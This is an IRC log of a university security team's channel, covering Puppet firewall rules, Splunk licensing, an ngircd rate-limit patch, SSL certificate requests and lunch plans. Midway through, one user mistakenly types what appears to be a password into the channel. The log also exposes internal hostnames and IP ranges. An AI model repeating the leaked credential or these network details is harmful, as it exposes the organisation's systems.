2015-02-06 16:57:08	soehlert	        return "SOCKS 127.0.0.1:12345"; // (IP:port)
2015-02-06 16:57:08	soehlert	    return "DIRECT";
2015-02-06 16:57:37	jazoff	odd
2015-02-06 16:58:23	soehlert	anyways, not super important at the minute. 
2015-02-06 16:58:23	soehlert	did we decide what to do with cyclone? 
2015-02-06 16:58:32	soehlert	should i reinstall that as centos for that second license?
2015-02-06 16:59:08	jazoff	i guess we can.. i'd hold off though
2015-02-06 16:59:18	jazoff	still need to move over some saved searches
2015-02-06 16:59:33	soehlert	i dont' care. if you dont think it's useful im totally fine with ditching once you get your stuff off there
2015-02-06 17:00:50	jazoff	couldn't hurt to have a test server
2015-02-06 17:01:11	wraquel	If we have more license alerts I'd be more comfortable with reusing the 10G license as a second indexer instead of upping our limit at CITES.
2015-02-06 17:02:26	soehlert	fair enough. jazoff whenever you get your searches off there, lemme know and i'll set up a new one fo ryou
2015-02-06 17:03:28	jazoff	ok
2015-02-09 00:55:09	soehlert	sooo box on osx has issues. http://enterprisemac.bruienne.com/2015/02/07/box-cutting-how-i-stumbled-onto-a-serious-security-flaw-in-box-sync-for-mac/
2015-02-09 00:58:24	soehlert	wait, maybe this isn't box. I thought box sync was part of it..
2015-02-09 09:10:10	wraquel	Box sync for window is annoying too. It loads for every user. And after you edit the registry so it doesn't, if there's an update, it 'fixes' that.
2015-02-09 09:14:04	wraquel	Looks like accidental inclusion of credentials.
2015-02-09 09:47:03	wraquel	....
2015-02-09 09:47:34	wraquel	So, my middle son got smacked in the head with a golf club and is going to the ER. I'm heading home.
2015-02-09 09:48:29	jazoff	:(
2015-02-09 09:50:22	wraquel	For now, it looks like just stitches.
2015-02-09 09:50:31	wraquel	I'm guessing we'll have to watch for concussion.
2015-02-09 09:50:46	wraquel	But 2nd graders aren't known for their follow-through
2015-02-09 09:53:44	wraquel	Just noticed a keypass google sync plugin on sourceforge.
2015-02-09 09:53:52	wraquel	er, keepass
2015-02-09 11:02:19	soehlert	oh jeeze sorry to hear that wraquel thats no good. 
2015-02-09 11:04:10	soehlert	jazoff: what was up with the double inseucre software email? trying out a new one or something?
2015-02-09 11:10:49	eyrich	jazoff: what was the conenction from relays to something on 10 that is working properly? 
2015-02-09 11:11:09	eyrich	without port forwarding, unlike current relay to splunk
2015-02-09 11:14:45	jazoff	soehlert: yeah. I was missing a check box so it didnt send the results
2015-02-09 11:14:50	jazoff	so I fixed it and bumped up the time
2015-02-09 11:16:09	jazoff	eyrich: splunk
2015-02-09 11:16:16	jazoff	ohh. IS working?
2015-02-09 11:16:22	eyrich	ya thats the one use port forwarding.
2015-02-09 11:16:23	jazoff	i dunno.. I'm not aware of anything else like that
2015-02-09 11:16:37	eyrich	there was something else you pointed out I thought
2015-02-09 11:18:12	jazoff	oh.. yeah...
2015-02-09 11:18:16	jazoff	it works the other way 
2015-02-09 11:18:27	jazoff	well maybe..
2015-02-09 11:18:34	jazoff	i noticed splunk-sec could LOG to the relays
2015-02-09 11:18:40	jazoff	but that is to the virtual IP so that might not be apples to apples
2015-02-09 11:19:26	eyrich	ok no big deal, I was going to go back to working on that now that the ESX to switch connections are in agg groups
2015-02-09 11:19:32	eyrich	and working
2015-02-09 11:20:14	jazoff	oh.. i'm fine with the port forward as long as it works
2015-02-09 11:24:50	soehlert	i think eyrich wants to avoid those if possible though
2015-02-09 11:25:14	eyrich	I prefer to not have them, but if thats what it takes
2015-02-09 11:27:46	soehlert	fair enough. 
2015-02-09 11:28:27	eyrich	it shouldnt  be needed between relays and splunk but something funny was going on with the routing, and I was happy to just make it work. 
2015-02-09 11:28:48	eyrich	I think its related to 1:1 nat relays
2015-02-09 11:31:17	soehlert	i see
2015-02-09 12:06:10	eyrich	i talked to chadchad about the gpfsftp host - its his, he  will let us know when it is fixed and can be unblocked
2015-02-09 12:12:02	jazoff	:)
2015-02-09 12:12:14	jazoff	can something be done about the lack of owner info in netdot?
2015-02-09 12:12:41	eyrich	well neteng doesnt feel the need to keep it up to date. I think a manager needs to step in.
2015-02-09 12:15:02	jazoff	yeah.. from experience the only way that kind of thing gets fixed is if you start blocking everything without proper info
2015-02-09 12:15:19	jazoff	after you do that for a bit then there is incentive to keep records up to date
2015-02-09 12:15:59	eyrich	that was my thought too
2015-02-09 12:26:15	wraquel	I'm sure if we keep bugging ITS and NetEng enough about the owners of systems, someone will step up. Just need to ramp up requests.
2015-02-09 12:26:48	wraquel	10 an hour should do it....
2015-02-09 12:28:04	soehlert	lets automate this
2015-02-09 12:29:20	wraquel	were there any other issues with gpfsftp1?
2015-02-09 12:30:26	jazoff	not that I saw
2015-02-09 12:30:42	jazoff	i can use teh netdot api to find servers with no owner info
2015-02-09 12:34:48	wraquel	I don't know how reliable existing info is.
2015-02-09 12:35:01	wraquel	Is there a date for entry?
2015-02-09 12:36:12	jazoff	un BHRed that host and verified ntp is fixed
2015-02-09 12:39:36	jazoff	realized I have not had anything to eat today.. should fix that
2015-02-09 13:23:18	jschipp	A multiboot PXE VM for your workstation. No need to carry CDs or USB, just your laptop https://github.com/jonschipp/vagrant/tree/master/pxe-multiboot
2015-02-09 13:23:29	jschipp	easy to add new distros: e.g. ./new_iso --os CentOS --version 7.0 --url http://mirror.cs.uwp.edu/pub/centos/7.0.1406/isos/x86_64/CentOS-7.0-1406-x86_64-Minimal.iso
2015-02-09 13:24:24	jschipp	it's been a big time saver for me
2015-02-09 16:53:31	wraquel	so quiet
2015-02-09 17:07:42	jazoff	yeah
2015-02-09 17:07:47	jazoff	was talking to bob about the ssl stuff
2015-02-09 17:08:05	soehlert	im trying to remember how to do fpm stuff :)
2015-02-09 17:08:18	jazoff	soehlert: you still have the packages repo checked out?
2015-02-09 17:08:24	jazoff	just copy one of the existing dirs
2015-02-09 17:08:26	soehlert	yup
2015-02-09 17:08:35	jazoff	this for that irc server?
2015-02-09 17:09:12	soehlert	just playing with ngircd so just getting used to how that installs and then i'll copy. i might have a weird dir of ngircd stuff
2015-02-09 17:09:12	soehlert	comes with a spec file and stuff. not a tar.gz
2015-02-09 17:09:12	soehlert	so just tsrying to figure it out
2015-02-09 17:09:34	jazoff	oh?
2015-02-09 17:09:42	jazoff	i couldn't figure out the .spec stuff
2015-02-09 17:09:47	jazoff	I need to try again at some point
2015-02-09 17:10:06	jazoff	i mean, fpm just generates it, so in theory you can just tell it to do that and see what the resulting file is
2015-02-09 17:10:16	soehlert	ya well part of it is its technically got a fedora package so i grabbed the fedora one with the el6 part so maybe i can do that
2015-02-09 17:10:25	soehlert	but ya just a bunch of try this and see what happens
2015-02-09 17:36:49	jazoff	figured out how to get ngircd to not rate limit...
2015-02-09 17:36:51	jazoff	-#define MAX_COMMANDS 3                 /** Max. commands per loop for users */
2015-02-09 17:36:53	jazoff	+#define MAX_COMMANDS 200                       /** Max. commands per loop for users */
2015-02-09 17:36:56	jazoff	in conn.c
2015-02-09 18:02:10	<--	wraquel (wraquel@hidden-3819C22F.ncsa.illinois.edu) has quit (Ping timeout)
2015-02-09 18:05:01	-->	wraquel (wraquel@hidden-3819C22F.ncsa.illinois.edu) has joined #security
2015-02-09 18:09:44	soehlert	what do you want those set to?
2015-02-10 01:30:55	<--	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has quit (Ping timeout)
2015-02-10 07:31:09	-->	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has joined #security
2015-02-10 09:09:19	jazoff	wraquel: i dont have access to that igtf page
2015-02-10 09:14:00	wraquel	jazoff: hrm.
2015-02-10 09:23:22	wraquel	jazoff: got a timeframe for an initial interface test?
2015-02-10 09:27:44	jazoff	oh.. a ways away
2015-02-10 09:27:51	jazoff	still working out the data model
2015-02-10 09:29:26	wraquel	we talking weeks or months?
2015-02-10 09:29:35	wraquel	Joe's askin
2015-02-10 09:32:01	jazoff	weeks I think..
2015-02-10 09:32:34	jazoff	what does turning off those fields actually do?
2015-02-10 09:33:08	jazoff	the API doesn't have anything like that from what i can tell
2015-02-10 09:34:22	wraquel	I think it changes the subject name to exclude the PostalCode and Address so that it matches the IGTF chain.
2015-02-10 09:34:29	wraquel	Otherwise, no match and failure
2015-02-10 09:38:12	jazoff	hmm
2015-02-10 09:38:21	jazoff	it can do that without changing the CSR?
2015-02-10 09:42:29	wraquel	yeah
2015-02-10 09:43:32	jazoff	hmm'
2015-02-10 09:43:40	jazoff	well that makes things fun
2015-02-10 09:50:54	wraquel	well, if anything, it could probably be negotiated with them to include that kind of thing in the API.
2015-02-10 09:51:33	jazoff	well if it is just part of the CSR then I guess it is just a matter of using a ssl lib to edit it
2015-02-10 09:51:47	wraquel	hmmm...
2015-02-10 10:24:29	jschipp	fy: git-sec maybe unavailable for a little bit
2015-02-10 10:24:34	jschipp	fyi*
2015-02-10 10:28:39	jschipp	it seems to be fine now
2015-02-10 10:28:45	jschipp	carry on 
2015-02-10 12:12:18	soehlert	jazoff: what did you want those values set to in the ngircd conf?
2015-02-10 12:12:54	jazoff	change MAX_COMMANDS from 3 to 200
2015-02-10 12:13:13	jazoff	it's not in the conf, it's hard coded in conf.c
2015-02-10 12:13:40	jazoff	though you can change the make command to
2015-02-10 12:13:52	jazoff	make CFLAGS=-DMAX_COMMANDS=300
2015-02-10 12:13:53	jazoff	that might work too
2015-02-10 12:14:36	jazoff	or just make a patch and have fpm run patch before make.. lots of options
2015-02-10 12:19:23	soehlert	oops i misread that thought it was two different things you wanted to change
2015-02-10 12:28:39	jazoff	that'll fix the slow response from ncsabot
2015-02-10 14:53:55	soehlert	jschipp: what was with all the load nagios errors last night? i noticed they were also in testing. were they accidentally pushed to production or were they legit?
2015-02-10 14:59:13	jschipp	those machines load were higher than usual, I don't know why
2015-02-10 14:59:27	jschipp	nagios accurately reported it
2015-02-10 15:00:18	jschipp	I'll see if terry konws
2015-02-10 15:00:26	soehlert	ok
2015-02-10 15:01:21	jschipp	well, actually it was sent to them, they haven't said anything so i presume they may know wh
2015-02-10 15:01:25	jschipp	why*
2015-02-10 15:04:11	soehlert	oh right they get those too
2015-02-10 15:21:57	soehlert	sweet lync no longer accepting my password all of a sudden
2015-02-10 15:37:56	jazoff	https://blog.docker.com/2015/02/docker-1-5-ipv6-support-read-only-containers-stats-named-dockerfiles-and-more/
2015-02-10 15:44:54	jschipp	yay stats
2015-02-10 15:45:07	jazoff	I was more "yay read only containers and named dockerfiles"
2015-02-10 16:01:47	jschipp	yay, read only containers I can take advantage of
2015-02-10 16:02:09	jschipp	but per container stats isn't easy so I'm glad they have a tool for it now
2015-02-10 16:02:55	jazoff	read only containers should spead up try.bro.org too
2015-02-10 16:03:22	jazoff	since I use a volume for the logs, nothing else being writable should mean it doesnt have to allocate a FS taht is just going to be removed
2015-02-10 16:03:45	jazoff	and the named docker files will mean I can simplify the repo that builds all the different bro containers
2015-02-10 16:03:57	jazoff	wraquel: are you skaro?
2015-02-10 16:07:04	wraquel	jazoff: yes
2015-02-10 16:07:09	wraquel	what did I download
2015-02-10 16:07:36	jazoff	timestomp.exe
2015-02-10 16:07:55	jazoff	which I figured may be intentional?
2015-02-10 16:07:58	wraquel	Weird. I though I downloaded a gui for it but not the actual original timestomp.exe
2015-02-10 16:07:59	jazoff	but there are some otehr things that look odd
2015-02-10 16:08:02	jazoff	https://portal-sec.internal.ncsa.edu/static/ninfo/index.html#/single/141.142.23.15
2015-02-10 16:08:09	wraquel	Yeah, working on a forensic lab image.
2015-02-10 16:08:11	jazoff	like the connections to 37.11.35.28
2015-02-10 16:08:17	jazoff	ah
2015-02-10 16:08:45	jazoff	yeah I figured it was a VM based on the mix of user agents
2015-02-10 16:09:03	wraquel	Yeah, trying to find cat pictures to put on the images. Then I realized I might have licensing issues because this is going to be redistributed.
2015-02-10 16:10:07	wraquel	Dasalot of user agents.
2015-02-10 16:11:43	jazoff	flikr has a CC search
2015-02-10 16:11:56	jazoff	https://www.flickr.com/creativecommons/
2015-02-10 16:14:38	wraquel	yeah.
2015-02-10 16:14:46	wraquel	I ended up just pulling my own images.
2015-02-10 16:39:45	wraquel	The funning thing about timestomp is that that link is a 404.
2015-02-10 16:41:07	jazoff	oh?
2015-02-10 16:41:31	wraquel	pretty sure. let me try again.
2015-02-10 16:42:01	wraquel	ERROR 404: Not Found.
2015-02-10 16:42:12	jazoff	so it was
2015-02-10 16:42:19	jazoff	well the bro alert was based on the url
2015-02-10 16:42:26	wraquel	yeah, figured.
2015-02-10 17:03:17	jazoff	neat.. added some more graphs to the test influxdb/grafana
2015-02-10 17:03:39	jazoff	one thing that you notice right away is there is a huge spike in DNS every 10 minutes from the mail servers
2015-02-10 17:05:21	jazoff	might be worth filtering that out and not sending it to splunk.. if a large percentage of DNS is just dns queries to RBLS and things like that
2015-02-10 17:07:13	jazoff	ah, i think it might be more a spike in replies
2015-02-10 17:07:30	jazoff	it's the MX and TXT reply count values that spike
2015-02-10 17:07:35	jazoff	interesting :)
2015-02-11 00:44:06	soehlert	http://lkml.iu.edu/hypermail/linux/kernel/1502.1/00753.html
2015-02-11 00:44:06	soehlert	live kernel patching possibly coming soon
2015-02-11 08:14:55	jazoff	eyrich: working on the puppet rules
2015-02-11 08:15:05	eyrich	ok
2015-02-11 08:23:53	jazoff	grr, it added the fixed rules but didnt remove the old ones
2015-02-11 08:26:56	jazoff	ok.
2015-02-11 08:26:57	jazoff	rescan?
2015-02-11 08:27:38	eyrich	started
2015-02-11 08:42:57	jazoff	should be much improved
2015-02-11 11:03:18	soehlert	what puppet rules? fw stuff?
2015-02-11 11:03:23	jazoff	yeah
2015-02-11 11:16:44	eyrich	qualys still found puppet-sec on 61613 8140 8081 - with sslv3 turned on
2015-02-11 11:16:50	jazoff	uhhh
2015-02-11 11:17:01	eyrich	oh wait - looking at old scan
2015-02-11 11:17:03	eyrich	hold on
2015-02-11 11:17:04	jazoff	:)
2015-02-11 11:29:12	eyrich	confirmed puppet-sec cleaned up
2015-02-11 12:34:30	jazoff	anyone happen to have a redhat account? https://access.redhat.com/articles/1323793
2015-02-11 12:37:42	wraquel	jazoff: we do
2015-02-11 12:37:47	wraquel	It's in laspass
2015-02-11 12:37:51	wraquel	I think it's ncsa.secops?
2015-02-11 12:38:06	jazoff	hmm
2015-02-11 12:38:40	jazoff	heyyy it worked
2015-02-11 12:38:47	wraquel	yep. It's a pdf
2015-02-11 12:48:50	jazoff	not sure if there is anything actionable in it though
2015-02-11 12:49:04	jazoff	only some of it applies to 6.6 anyway
2015-02-11 13:35:28	soehlert	hey jazoff  i think you killed puppet
2015-02-11 13:35:32	soehlert	CAs cant get to it
2015-02-11 13:35:54	jazoff	errrrrrrr
2015-02-11 13:35:58	soehlert	i assume you just ok'd 141.142.148 and 10.142.148?
2015-02-11 13:36:04	jazoff	i used teh helper.. yeah
2015-02-11 13:36:09	jazoff	what ips do the cas have?
2015-02-11 13:36:10	soehlert	and forgo the 141.142.149.0/25
2015-02-11 13:36:27	soehlert	also, the relays might have issues no?
2015-02-11 13:36:30	jazoff	should the CAs fall under teh usual firewall rules?
2015-02-11 13:36:35	jazoff	no, I added the relays to thehelper
2015-02-11 13:36:40	soehlert	ah ok
2015-02-11 13:36:49	soehlert	i dont understand your question
2015-02-11 13:36:50	jazoff	should I add the CAs to just puppet  or just add them to the helper?
2015-02-11 13:37:08	jazoff	which will allow them to connect to anything else that uses the security_allow
2015-02-11 13:37:25	soehlert	i mean theres a hw fw in front of them, but i spose probably just call them out explicitly
2015-02-11 13:37:37	soehlert	err that allows them to connect out? that's probably fine.
2015-02-11 13:37:42	jazoff	yeah
2015-02-11 13:37:53	soehlert	ya just a helper should be fine then.
2015-02-11 13:38:04	soehlert	its up to the hosts getting the packets to decide whats allowed
2015-02-11 13:38:39	jazoff	hmm?
2015-02-11 13:39:12	soehlert	poor wording. im not concerned if the CAs have tha bility to reach anything. if we dont want them to reach something, we will use the fw on the host they are trying to get to to limit
2015-02-11 13:39:23	jazoff	right.. but that's what I am changing
2015-02-11 13:39:31	jazoff	the fw::helpers::security_allow helper
2015-02-11 13:40:04	soehlert	yes you're allowing the CAs to reach anything, but the other side has to accept still
2015-02-11 13:40:04	soehlert	and we've always used incoming fw to limit who can talk to a box
2015-02-11 13:40:24	jazoff	no, I'm allowing things to be reached by the CAs
2015-02-11 13:40:32	jazoff	the incoming FW is what I am changing
2015-02-11 13:40:43	soehlert	ohh right right. not thinking right
2015-02-11 13:41:02	jazoff	so the easiest way to fix the puppet thing is just add the CA net to the fw::helpers::security_allow
2015-02-11 13:41:14	jazoff	which will fix puppet and also update anything else that is allowing connections from the security net
2015-02-11 13:41:15	soehlert	right. hmm
2015-02-11 13:41:19	soehlert	eyrich: got an opinion
2015-02-11 13:41:21	soehlert	?
2015-02-11 13:41:36	jazoff	which granted, is not much
2015-02-11 13:41:45	jazoff	other than puppet splunk is the only thing that is using that helper
2015-02-11 13:41:50	jazoff	though more things should probably be using it :)
2015-02-11 13:42:02	soehlert	agreed
2015-02-11 13:42:43	jazoff	well, I updated it
2015-02-11 13:43:00	jazoff	doesnt matter for splunk at least and that's the only other thing that will be affected now
2015-02-11 13:44:08	soehlert	ya eyrich and i talked about it and don't mind it
2015-02-11 13:45:03	jazoff	something is broke on git-sec
2015-02-11 13:45:14	soehlert	?
2015-02-11 13:45:15	jazoff	it's not sending teh web-hook POST to puppet and the UI seems to be stuck on yesterday
2015-02-11 13:45:42	jazoff	last commit it shows on puppet was from jschipp changing the git module :)
2015-02-11 13:45:45	soehlert	oo thats no good
2015-02-11 13:45:50	soehlert	ahh that sounds related
2015-02-11 13:46:41	jazoff	manually pulled for now
2015-02-11 13:47:33	soehlert	i think you killed ncsabot?!
2015-02-11 13:47:47	jazoff	lol
2015-02-11 13:48:00	jazoff	i hit 'test' on the webhook
2015-02-11 13:48:10	soehlert	you did fix puppet on cool though :)
2015-02-11 13:48:17	jazoff	yay
2015-02-11 13:48:29	jazoff	2015-02-11T13:46:48.527962-06:00 puppet-sec puppet-agent[18464]: (/Stage[main]/Puppetstuff::Autopull/Fw::Helpers::Security_allow[210 accept puppet]/Firewall[210 accept puppet - CA hosts]/ensure) created
2015-02-11 13:48:34	jazoff	2015-02-11T13:46:48.801077-06:00 puppet-sec puppet-agent[18464]: (/Stage[main]/Puppetstuff::Autopull/Fw::Helpers::Security_allow[220 accept puppet orchestration]/Firewall[220 accept puppet orchestration - CA hosts]/ensure) created
2015-02-11 13:48:38	jazoff	2015-02-11T13:46:49.178738-06:00 puppet-sec puppet-agent[18464]: (/Stage[main]/Puppetstuff::Autopull/Fw::Helpers::Security_allow[230 accept puppetdb connections]/Firewall[230 accept puppetdb connections - CA hosts]/ensure) created
2015-02-11 13:48:42	jazoff	(not sure how that ended up in the autopull module :))
2015-02-11 13:48:58	soehlert	haha strange.
2015-02-11 13:49:49	jschipp	the change I made was for puppetizing gitlab more thoroughly - httpd config, adding ssl certs, cleanup up gitlab config, etc
2015-02-11 13:50:44	jazoff	maybe the background workers are broked?
2015-02-11 13:51:00	soehlert	hah i dont know if you did that on purpose but i like "broked"
2015-02-11 13:51:01	jschipp	let me check
2015-02-11 13:51:27	jschipp	all running, hmmm
2015-02-11 13:51:48	jschipp	what url are you using for the post hook?
2015-02-11 13:52:00	jschipp	I disabled http
2015-02-11 13:52:17	jazoff	it's an outbound request, not inbound
2015-02-11 13:52:38	jazoff	see how https://git-sec.internal.ncsa.edu/ncsa-security/puppet is stuck on yesterday?
2015-02-11 13:54:46	jschipp	yeah
2015-02-11 13:56:47	soehlert	well lemme know when it's fixed please. waiting on puppet to cehck something off the todo
2015-02-11 13:57:13	jazoff	soehlert: git itself is fine, so you can just manually git pull on puppet-sec
2015-02-11 13:57:41	jazoff	i thought we had a backup cronjob in there somewhere
2015-02-11 13:57:42	soehlert	ah ok
2015-02-11 14:01:24	soehlert	i think we removed the cronjob
2015-02-11 14:01:38	soehlert	dont remember our thinking, but i feel like i remember that conversation
2015-02-11 14:11:05	jazoff	same :)
2015-02-11 14:13:17	soehlert	then it's settled. we did something for some reason
2015-02-11 14:15:12	jazoff	or didn't do something for no reason
2015-02-11 14:15:18	soehlert	also possible
2015-02-11 14:56:23	jschipp	lol
2015-02-11 14:57:00	jschipp	weird how the commits in the commits tab are corret but the feed on the project page isn't updating
2015-02-11 14:59:27	jschipp	fyi: there's a new defcon group that meets in at Quality bar in CU http://dc217.org/
2015-02-11 15:23:27	jazoff	https://code.facebook.com/posts/717010588413497/introducing-6-pack-the-first-open-hardware-modular-switch/
2015-02-11 15:40:52	jschipp	rebooting git-sec
2015-02-11 15:43:48	jschipp	back up
2015-02-11 15:55:21	soehlert	eyrich: pushed the fw rule to dev. will test tomorrow and push accordingly.
2015-02-11 15:55:28	eyrich	ok
2015-02-11 23:27:36	--	irc: disconnected from server
2015-02-11 23:27:47	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2015-02-11 23:27:47	--	Channel #security: 7 nicks (0 ops, 0 halfops, 0 voices, 7 normals)
2015-02-11 23:27:59	--	Mode #security [+]
2015-02-11 23:27:59	--	Channel created on Tue, 04 Feb 2014 20:39:53
2015-02-12 00:04:13	--	irc: disconnected from server
2015-02-12 00:04:23	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2015-02-12 00:04:23	--	Channel #security: 7 nicks (0 ops, 0 halfops, 0 voices, 7 normals)
2015-02-12 00:04:35	--	Mode #security [+]
2015-02-12 00:04:35	--	Channel created on Tue, 04 Feb 2014 20:39:53
2015-02-12 01:32:07	soehlert	haha this is so awesome and useless. https://github.com/mofarrell/p2pvc
2015-02-12 07:47:31	wraquel	If any of you work with Bob at CITES Security, he's leaving for greener pastures.
2015-02-12 07:47:46	jazoff	oh? I just mailed him about the ssl thing
2015-02-12 07:48:00	wraquel	You also emailed Wayland about the SSL stuff.
2015-02-12 07:48:06	wraquel	He forwarded it to me.
2015-02-12 07:48:08	jazoff	yeah, I wrote him by mistake
2015-02-12 07:48:15	jazoff	BHR -> wayland
2015-02-12 07:48:15	jazoff	SSL -> bob
2015-02-12 07:48:19	jazoff	got them mixed up
2015-02-12 07:48:52	wraquel	ncurses video chat? Weird
2015-02-12 07:48:53	jazoff	started building the app last night, made a lot of progress
2015-02-12 07:48:58	wraquel	awesome
2015-02-12 07:49:05	wraquel	Well, resend to Bob if you didn't already
2015-02-12 07:49:08	jazoff	i did 
2015-02-12 07:50:20	jazoff	worked out some of the initial tables for Authorizations and Requests
2015-02-12 07:55:12	jazoff	wraquel: for SSL certs.. do you know what the whole 'server type' option does?
2015-02-12 07:55:30	jazoff	I've always thought it is just for metrics on the CAs end, does it acutally change the resulting cert in any way?
2015-02-12 08:34:16	wraquel	jazoff: Server Type is stupid.
2015-02-12 08:34:38	wraquel	Basically it let's InCommon know what format to send the certificate back in.
2015-02-12 08:34:58	wraquel	So if you say 'Apache/ModSSL' it'll send it back in base64
2015-02-12 08:35:14	wraquel	If you say, something like IIS, it'll send it back as pks12
2015-02-12 08:35:21	wraquel	or wahtever.
2015-02-12 08:35:33	jazoff	ah, that's what i thought
2015-02-12 08:36:44	wraquel	If you expect InCommon to provide the cert directly to the admin, that's one less conversion step for the admin. If not, it's not terribly difficult to convert from one format to another on the backend.
2015-02-12 08:38:15	jazoff	yep
2015-02-12 08:38:49	jazoff	odd that it makes that a property of the request rather than just giving you all the download options after the fact
2015-02-12 09:05:51	wraquel	jschipp: http://www.movoto.com/champaign-il/champaign-urbana-restaurants/
2015-02-12 09:16:37	eyrich	wraquel: I thought it just put the mort likely format at the top of the email
2015-02-12 09:16:53	eyrich	you could get the other formats in links lower in the message
2015-02-12 09:20:10	jazoff	that's funny if that is all it does
2015-02-12 09:36:12	eyrich	other formats available PKCS#7 base64, PKCS#7 bin
2015-02-12 09:36:23	eyrich	in addition to the x509 base64 listed as most suitable
2015-02-12 09:39:29	wraquel	Man, someone's pissed off about the puzzle box https://www.reddit.com/r/UIUC/comments/2vkzig/the_puzzle_box_is_broken_again_and_people_took/
2015-02-12 11:20:12	jschipp	wraquel: the last comment is hilarious
2015-02-12 11:51:32	soehlert	wraquel: a food list of best of champaign with biaggis and destihl on it? weaaaak
2015-02-12 11:57:09	wraquel	Yeah, I didn't notice those down the list.
2015-02-12 11:57:22	wraquel	Although a few others are decent mentions.
2015-02-12 12:00:29	soehlert	That's true some ones I hadn't expected on there
2015-02-12 12:01:16	soehlert	an old friend of mine asked me for stuff to do in champaign as her friend was bringing her bf to champaign for a special day centered around destihl. i was all confused why anyone would drive from indiana just to go to destihl.
2015-02-12 12:02:54	wraquel	Because they can't get to Bloomington?
2015-02-12 12:02:57	wraquel	:)
2015-02-12 12:06:52	wraquel	Well, I do have to say that their espresso rubbed steak is pretty damn good. Other than that, I haven't been all that impressed with their beer.
2015-02-12 12:07:13	soehlert	haha i told her to skip the destihl try blind pig for the brewery and then any of a bunch of other places for dinner
2015-02-12 12:07:45	wraquel	They can do tapas at Radio Maria.
2015-02-12 12:07:58	wraquel	Get some meat at Escobars
2015-02-12 12:08:01	soehlert	yup thats a good combo
2015-02-12 12:08:29	soehlert	actually i think jenna and i did that our first date night after we starting dating. piglet and radio maria
2015-02-12 12:08:34	wraquel	I like the burgers at Farrens, but I don't ever really choose to go there. I think they're a little over priced.
2015-02-12 12:15:23	jazoff	i had the burger at farrens... good stuff
2015-02-12 12:15:40	jazoff	though everytime I go there I always want to eat what someone else got
2015-02-12 12:16:21	jazoff	odd that I've never gone to Maize
2015-02-12 12:19:30	soehlert	hahah ya i get that saame thing at farrens, always want what everyone else has
2015-02-12 12:19:52	soehlert	maize is good but such a pain. far enough away to prolly drive, but there's only 4 spots or smoething like that
2015-02-12 12:31:26	jazoff	oh? it says it is on green st.
2015-02-12 12:31:55	eyrich	jazoff: very west green - well past campus town
2015-02-12 12:32:14	eyrich	its near the tracks that are east of neil
2015-02-12 12:32:21	jazoff	oh, it's past papa dels
2015-02-12 12:32:27	eyrich	yep
2015-02-12 12:33:02	jazoff	things look small on the map :)
2015-02-12 12:50:26	wraquel	It's about a brisk 17ish minute walk from NCSA.
2015-02-12 12:50:45	wraquel	I suggest the huarches.....
2015-02-12 12:50:52	wraquel	mmmmmm
2015-02-12 12:51:00	wraquel	damn. now I want maize.
2015-02-12 12:54:08	jschipp	wraquel: we can make that happen 
2015-02-12 12:55:29	soehlert	jazoff: they do serve meat there
2015-02-12 12:55:39	jazoff	:)
2015-02-12 12:56:12	wraquel	I have a call in like 2 minutes.
2015-02-12 12:56:14	wraquel	:(
2015-02-12 12:56:29	jschipp	after maybe
2015-02-12 12:56:40	wraquel	jeeze, twist my arm.
2015-02-12 12:57:40	jschipp	that's what friends are for
2015-02-12 12:57:47	jschipp	they help each other to maize
2015-02-12 12:58:23	wraquel	You don't want them to get lost getting there. Yes that was a very intentionally bad pun.
2015-02-12 12:58:49	jschipp	lol
2015-02-12 13:01:14	soehlert	hah
2015-02-12 13:06:53	wraquel	jschipp: in ISLET, what does "Launching container failed!" mean?
2015-02-12 13:11:55	jschipp	the container couldn't launch, set DEBUG=yes in islet.conf to get the exact command used
2015-02-12 13:11:57	jschipp	lol
2015-02-12 13:12:08	jschipp	docker couldn't run it
2015-02-12 13:18:41	wraquel	I don't have that control.
2015-02-12 13:18:51	wraquel	This is Wayland's baby.
2015-02-12 13:19:08	jschipp	ah, I told him to do that few days ago
2015-02-12 13:21:08	wraquel	Hey, Far Cry 4 is on steam sale... Now it's ONLY $40..... Yeah, I'll wait.
2015-02-12 13:21:13	jschipp	the container probably doesn't exist anymore
2015-02-12 13:21:21	wraquel	that effer
2015-02-12 13:21:35	wraquel	I was in the middle of sumpin
2015-02-12 13:21:54	wraquel	Hmmm. Could I kill it if I ran out of disk space? :)
2015-02-12 13:22:10	wraquel	jhaoDKjdlklkdlkjID88989D
2015-02-12 13:22:15	wraquel	son of a
2015-02-12 13:22:17	eyrich	do you think comcast will mind that I have downloaded over 1TB this month?
2015-02-12 13:22:24	jschipp	lol
2015-02-12 13:22:30	eyrich	wraquel: hah - time for a new random password
2015-02-12 13:22:54	wraquel	If you look at it, it's not all that random.
2015-02-12 13:23:13	wraquel	Right home row jam, a few numbers and another couple of keypresses.
2015-02-12 13:24:40	wraquel	who wants a taco
2015-02-12 13:27:18	jazoff	me
2015-02-12 13:30:01	jschipp	huarches
2015-02-12 13:31:10	wraquel	huarchessssss
2015-02-12 13:45:10	jschipp	I think routing is messed up on puppet-sec, nagios can't reach it
2015-02-12 13:45:28	soehlert	what net is nagios on? puppet-sec got locked down
2015-02-12 13:46:16	jschipp	it's not iptables, I checked
2015-02-12 13:46:17	jschipp	10.142.148.0    141.142.148.126 255.255.255.0   UG        0 0          0 eth0
2015-02-12 13:46:17	jschipp	10.142.148.0    0.0.0.0         255.255.255.0   U         0 0          0 eth1
2015-02-12 13:46:26	soehlert	ok
2015-02-12 13:46:32	soehlert	that looks correct
2015-02-12 13:46:38	jschipp	eth0 is the public ip interface
2015-02-12 13:47:01	soehlert	is this on puppet-sec or nagios-sec? formatting makes it tough to read here
2015-02-12 13:47:08	jschipp	puppet-sec
2015-02-12 13:47:30	jschipp	I know it's not nagios because it can reach all the other hosts
2015-02-12 13:48:12	soehlert	strange since everyone else can reach puppet sec
2015-02-12 13:48:26	soehlert	that does look weird though looking at its routing table
2015-02-12 13:48:40	jschipp	they can reach it on its public ip
2015-02-12 13:48:53	jschipp	the private ip on eth1 is the issue
2015-02-12 13:49:01	soehlert	internal only hosts can get to it still im pretty sure
2015-02-12 13:49:11	soehlert	testing now
2015-02-12 13:49:19	jschipp	git-sec is internal only host and cannot
2015-02-12 13:50:15	jschipp	it shouldn't be routing 10.142.148.0 through a gateway of 141.142.148.126 on eth0
2015-02-12 13:50:16	soehlert	portal-sec is internal only and can reach it fine
